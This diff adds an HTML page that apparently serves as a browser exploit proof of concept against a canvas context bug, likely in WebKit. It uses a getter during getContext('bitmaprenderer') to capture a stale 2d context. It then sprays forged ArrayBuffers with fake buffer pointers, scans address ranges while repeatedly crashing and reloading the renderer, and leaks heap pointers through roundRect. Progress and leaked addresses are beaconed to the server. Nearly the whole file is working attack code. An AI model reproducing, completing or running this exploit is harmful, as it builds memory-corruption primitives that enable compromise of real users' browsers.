@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V923I - controlled V569 self-scan (chunked) + roundRect leak on HIT</title>
+<style>
+  body { background:#0b0e14; color:#d7e0ea; font-family:ui-monospace,Menlo,monospace; padding:14px; }
+  h1 { color:#58a6ff; font-size:15px; margin:0 0 6px; }
+  p  { color:#8b949e; font-size:12px; margin:4px 0 10px; line-height:1.55; }
+  pre { font-size:12px; white-space:pre-wrap; }
+  code { color:#c9d1d9; background:#21262d; padding:1px 5px; border-radius:4px; }
+  .key { border-left:3px solid #3fb950; padding-left:8px; }
+</style>
+</head>
+<body>
+<h1>V923I - controlled V569 self-scan (chunked) &rarr; roundRect heap-pointer leak on HIT</h1>
+
+<p class="key">
+<b>Controlled alternative to V923E</b> (V923E's full crash-scan triggered 14.20 memory dialog). Uses V569 self-forge
+(AB(768) pre-filled with <code>m_buffer=self+128, cap=1, size=1</code>, <code>lineWidth</code> marker) but runs in
+<b>small chunks</b>: does at most <code>max</code> attempts per session then beacons <code>V923I-PAUSED</code> and stops
+(reopen the same URL to continue; progress saved). On a <code>HIT</code> it does <b>beginPath/save/roundRect</b> in the
+same load and beacons <code>LEAK/NOWRITE</code>. Wrong base still crashes the WebProcess (inherent to the method) but only
+up to <code>max</code> times per open. Defaults: <code>start=0x200000000, end=0x280000000, n=200, max=30</code>.
+Override: <code>?start=&amp;end=&amp;n=&amp;max=</code> or <code>?m=self&amp;base=0x...</code>.
+</p>
+
+<pre id="out">starting...</pre>
+
+<script>
+'use strict';
+
+var SEEK = location.pathname;
+var RUN = 'r' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 7);
+
+function lsGet(k) { try { return window.localStorage.getItem('v923i_' + k); } catch (e) { return null; } }
+function lsSet(k, v) { try { window.localStorage.setItem('v923i_' + k, String(v)); } catch (e) {} }
+function lsDel(k) { try { window.localStorage.removeItem('v923i_' + k); } catch (e) {} }
+
+function bks(tag, body) {
+  var u = '/beacon/V923I-' + tag + '?d=' +
+          encodeURIComponent(String(body == null ? '' : body).slice(0, 460)) +
+          '&run=' + encodeURIComponent(RUN) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); }
+  catch (e) { try { var i = new Image(); i.src = u; } catch (e2) {} }
+}
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function hexAddr(a) { return (isFinite(a) && a >= 0) ? '0x' + Math.floor(a).toString(16) : 'nan'; }
+function errOf(e) { return e ? String(e.name || 'Error') + ':' + String(e.message || '').slice(0, 80) : 'none'; }
+
+var P = new URLSearchParams(location.search);
+var MODE = P.get('m') || 'scan';
+var N = +(P.get('n') || '200'); if (!(N > 0 && N < 2000)) N = 200;
+var SCAN_START = parseInt(P.get('start') || '200000000', 16) || 0x200000000;
+var SCAN_END   = parseInt(P.get('end')   || '280000000', 16) || 0x280000000;
+var SELF_BASE  = parseInt(P.get('base')  || '0', 16) || 0;
+var MAX = +(P.get('max') || '30'); if (!(MAX > 0 && MAX < 5000)) MAX = 30;
+var STRIDE = N * 768;
+var WORDS = 192;
+
+var VIEWS = null, KEEP = null, CTX = null, HASRR = false;
+
+function trigger(canvas) {
+  var saved = null, hasRR = false;
+  var dict = {};
+  Object.defineProperty(dict, 'alpha', {
+    get: function () {
+      var ctx = canvas.getContext('2d');
+      if (!ctx) return true;
+      saved = ctx;
+      try { hasRR = (typeof ctx.roundRect === 'function'); } catch (e0) {}
+      try { ctx.lineWidth = 3.14159; ctx.miterLimit = 7.77; ctx.globalAlpha = 0.42; } catch (e) {}
+      return true;
+    }
+  });
+  var bmp = null; try { bmp = canvas.getContext('bitmaprenderer', dict); } catch (e2) {}
+  return { saved: saved, hasRR: hasRR };
+}
+
+function sprayForged(base, count) {
+  var abs = new Array(count), views = new Array(count);
+  for (var i = 0; i < count; i++) {
+    var ab = new ArrayBuffer(768);
+    var dv = new DataView(ab);
+    var selfAddr = base + i * 768;
+    var bufAddr = selfAddr + 128;
+    dv.setUint32(32, 0x41414141, true);
+    dv.setUint32(36, 0x00000001, true);
+    dv.setUint32(112, (bufAddr >>> 0), true);
+    dv.setUint32(116, (Math.floor(bufAddr / 0x100000000) >>> 0), true);
+    dv.setUint32(120, 1, true);
+    dv.setUint32(124, 1, true);
+    dv.setFloat64(176, 9000 + i, false);
+    abs[i] = ab; views[i] = new Uint32Array(ab);
+  }
+  KEEP = abs; VIEWS = views;
+}
+
+function scanView(i, maxHits) {
+  var hits = [], v = VIEWS[i]; if (!v) return hits;
+  for (var w = 0; w < WORDS; w++) { if (v[w] !== 0) { hits.push([w, v[w]]); if (hits.length >= maxHits) return hits; } }
+  return hits;
+}
+function hitStr(hits) {
+  var a = []; for (var i = 0; i < hits.length; i++) {
+    if (hits[i].length === 3) a.push('v' + hits[i][0] + '/w' + hits[i][1] + '=0x' + hits[i][2].toString(16));
+    else a.push('w' + hits[i][0] + '=0x' + hits[i][1].toString(16));
+  } return a.join(',');
+}
+
+function step(tag, label, fn) {
+  bks(tag + '-PRE', label);
+  say(tag + ' ' + label);
+  lsSet('pending', tag + ':' + label);
+  var res, err = null;
+  try { res = fn(); } catch (e) { err = e; }
+  lsDel('pending');
+  if (err) { bks(tag + '-ERR', errOf(err)); say(tag + ' ERR ' + errOf(err)); return { ok: false }; }
+  bks(tag + '-OK', label);
+  return { ok: true, res: res };
+}
+
+function getScan() {
+  var next = SCAN_START, attempt = 0, session = 0;
+  try { var sg = lsGet('scan'); if (sg) { var o = JSON.parse(sg); next = o.next || SCAN_START; attempt = o.attempt || 0; session = o.session || 0; } } catch (e) {}
+  return { next: next, attempt: attempt, session: session };
+}
+function setScan(next, attempt, session, last) {
+  try { lsSet('scan', JSON.stringify({ next: next, attempt: attempt, session: session, last: last })); } catch (e) {}
+}
+
+function doHit(base, idx, lw) {
+  var hitAddr = base + idx * 768;
+  bks('HIT', 'idx=' + idx + ',hit=' + hexAddr(hitAddr) + ',base=' + hexAddr(base) + ',lw=' + lw);
+  say('!!!! HIT AB#' + idx + ' addr=' + hexAddr(hitAddr));
+  try { lsSet('hit', JSON.stringify({ addr: hexAddr(hitAddr), idx: idx, base: hexAddr(base) })); } catch (e) {}
+
+  if (!step('BP', 'beginPath', function () { CTX.beginPath(); }).ok) { bks('STOP', 'bp-failed'); return; }
+  bks('BPSURV', 'hit=' + hexAddr(hitAddr));
+  if (!step('SAVE', 'save-canary', function () { CTX.save(); }).ok) { bks('STOP', 'save-failed'); return; }
+
+  var ch = [];
+  for (var i = 0; i < VIEWS.length; i++) {
+    var v = VIEWS[i];
+    for (var w = 0; w < WORDS; w++) {
+      if (v[w] === 0) continue;
+      if (w === 8 || w === 9 || w === 28 || w === 29 || w === 30 || w === 31 || w === 44 || w === 45) continue;
+      ch.push([i, w, v[w]]); if (ch.length >= 24) break;
+    }
+    if (ch.length >= 24) break;
+  }
+  bks('CANARY', 'n=' + ch.length + ',' + hitStr(ch));
+
+  if (!HASRR) { bks('NORR', 'x'); return; }
+  if (!step('RR', 'roundRect(10,10,100,100,5)', function () { CTX.roundRect(10, 10, 100, 100, 5); }).ok) { bks('STOP', 'rr-failed'); return; }
+
+  var best = null;
+  var order = [idx]; for (var k = 0; k < VIEWS.length; k++) if (k !== idx) order.push(k);
+  for (var oi = 0; oi < order.length && !best; oi++) {
+    var vi = order[oi], v = VIEWS[vi];
+    for (var w = 0; w + 1 < WORDS; w += 2) {
+      if (w === 8 || w === 28 || w === 30 || w === 44) continue;
+      var lo = v[w], hi = v[w + 1]; if (lo === 0 && hi === 0) continue;
+      var val = hi * 0x100000000 + lo;
+      if (val > 0x100000 && val < 0x1000000000000) { best = { v: vi, w: w, val: val }; }
+    }
+  }
+  if (best) {
+    var cls = (best.val >= 0x800000000 && best.val < 0x900000000) ? 'wk-window' : (best.val >= 0x100000000 ? 'heap>4G' : 'heap<4G');
+    bks('LEAK', 'v=' + best.v + ',w=' + best.w + ',P=' + hexAddr(best.val) + ',cls=' + cls);
+    say('LEAK P=' + hexAddr(best.val));
+  } else {
+    var d = 'hit=' + idx + ':' + hitStr(scanView(idx, 20));
+    bks('NOWRITE', d.slice(0, 440));
+  }
+  bks('DONE', 'hit=' + hexAddr(hitAddr));
+}
+
+function main() {
+  if (P.get('reset') === '1') {
+    lsDel('scan'); lsDel('hit'); lsDel('pending'); lsDel('loads'); lsDel('session_loads');
+    bks('RESET', 'cleared'); say('cleared. reopen without reset=1'); return;
+  }
+
+  var loads = parseInt(lsGet('loads') || '0', 10) + 1;
+  lsSet('loads', loads);
+
+  var pend = lsGet('pending');
+  if (pend) {
+    lsDel('pending');
+    if (pend.indexOf('probe:LW') !== 0) { bks('CRASH', 'pending=' + pend + ',load=' + loads); say('CRASH ' + pend); return; }
+    bks('LWCRASH', 'load=' + loads);
+  }
+
+  if (MODE === 'self') {
+    var base = SELF_BASE; if (!base) { bks('ERR', 'self needs ?base=0x...'); return; }
+    bks('BOOT', 'm=self,load=' + loads + ',base=' + hexAddr(base) + ',N=' + N);
+    var canvas = document.createElement('canvas'); canvas.width = 1; canvas.height = 1; document.body.appendChild(canvas);
+    var tr = trigger(canvas); if (!tr.saved) { bks('ERR', 'trigger-failed'); return; }
+    CTX = tr.saved; HASRR = tr.hasRR; bks('PREFLIGHT', 'rr=' + HASRR);
+    sprayForged(base, N); bks('ARM', 'base=' + hexAddr(base));
+    lsSet('pending', 'probe:LW:lineWidth');
+    var lw, lerr = null; try { lw = CTX.lineWidth; } catch (e) { lerr = e; } lsDel('pending');
+    if (lerr) { bks('LW-ERR', errOf(lerr)); return; }
+    bks('LW-OK', 'lw=' + lw);
+    var idx = Math.round(lw - 9000);
+    if (idx >= 0 && idx < N) doHit(base, idx, lw); else bks('NOMATCH', 'lw=' + lw);
+    return;
+  }
+
+  var sc = getScan();
+  var sess = parseInt(lsGet('session_loads') || '0', 10);
+
+  if (sc.next >= SCAN_END) { bks('EXHAUSTED', 'end=' + hexAddr(SCAN_END) + ',attempt=' + sc.attempt); say('EXHAUSTED'); return; }
+
+  if (sess >= MAX) {
+    bks('PAUSED', 'doneThisSession=' + sess + ',max=' + MAX + ',next=' + hexAddr(sc.next) + ',attempt=' + sc.attempt + ',end=' + hexAddr(SCAN_END));
+    say('PAUSED after ' + sess + ' attempts. next=' + hexAddr(sc.next) + ' attempt=' + sc.attempt + '. Reopen this URL to continue.');
+    lsSet('session_loads', '0');
+    lsSet('scan', JSON.stringify({ next: sc.next, attempt: sc.attempt, session: (sc.session || 0) + 1 }));
+    return;
+  }
+
+  lsSet('session_loads', String(sess + 1));
+  var base = sc.next;
+  var next = base + STRIDE;
+  setScan(next, sc.attempt + 1, sc.session || 0, hexAddr(base));
+
+  bks('BOOT', 'm=scan,load=' + loads + ',sess=' + (sess + 1) + '/' + MAX + ',base=' + hexAddr(base) + ',next=' + hexAddr(next) + ',attempt=' + sc.attempt);
+  say('scan #' + sc.attempt + ' sess ' + (sess + 1) + '/' + MAX + ' base=' + hexAddr(base));
+
+  var canvas = document.createElement('canvas'); canvas.width = 1; canvas.height = 1; document.body.appendChild(canvas);
+  var tr = trigger(canvas);
+  if (!tr.saved) { bks('ERR', 'trigger-failed'); setTimeout(function(){ location.href = SEEK + location.search; }, 1500); return; }
+  CTX = tr.saved; HASRR = tr.hasRR;
+  bks('PREFLIGHT', 'rr=' + HASRR);
+  sprayForged(base, N);
+  bks('ARM', 'base=' + hexAddr(base));
+
+  lsSet('pending', 'probe:LW:lineWidth');
+  var lw, lerr = null; try { lw = CTX.lineWidth; } catch (e) { lerr = e; } lsDel('pending');
+  if (lerr) { bks('LW-ERR', errOf(lerr)); setTimeout(function(){ location.href = SEEK + location.search; }, 1500); return; }
+  bks('LW-OK', 'lw=' + lw);
+  var idx = Math.round(lw - 9000);
+  if (idx >= 0 && idx < N) { doHit(base, idx, lw); return; }
+  bks('NOMATCH', 'lw=' + lw);
+  setTimeout(function(){ location.href = SEEK + location.search; }, 1200);
+}
+
+try { main(); } catch (e) { bks('FATAL', String(e && (e.message || e)).slice(0, 200)); say('FATAL ' + e); }
+</script>
+</body>
+</html>
